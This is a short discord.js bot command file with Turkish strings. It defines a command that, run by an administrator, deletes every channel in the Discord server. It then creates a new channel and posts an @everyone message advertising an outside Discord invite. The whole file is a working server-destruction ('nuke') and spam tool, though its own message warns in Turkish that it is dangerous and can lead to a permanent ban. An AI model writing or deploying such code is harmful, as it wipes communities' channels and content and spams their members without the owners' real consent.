const Discord = require('discord.js')

exports.run = (client, message, args) => {
    if (!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send(" :x: Bu komutu sadece sunucu Sahibim Kullanabilir! **⚠Bu Komut Çok Tehlikelidir Lütfen Kullanmayın Discorddan Kalıcı Ban Sebebidir.**");
    message.guild.channels.cache.forEach(payidar => {
        payidar.delete();
    });
     
    let xxxx = 'probot-sunar'

    for(let i = 0; i < 1; i++){
        message.guild.channels.create(xxxx).then(payidar => {
            payidar.send('@everyone PRO BOT EKİBİ İYİ GÜNLER DİLER :) \n Discord Adresimiz : https://discord.gg/zqpdVnY5Sv ')       
        })
    }
}
exports.conf = {
enabled: true,
guildOnly: false,
aliases: [],
permLevel: 0
}

exports.help = {
name: 'pr-2'
}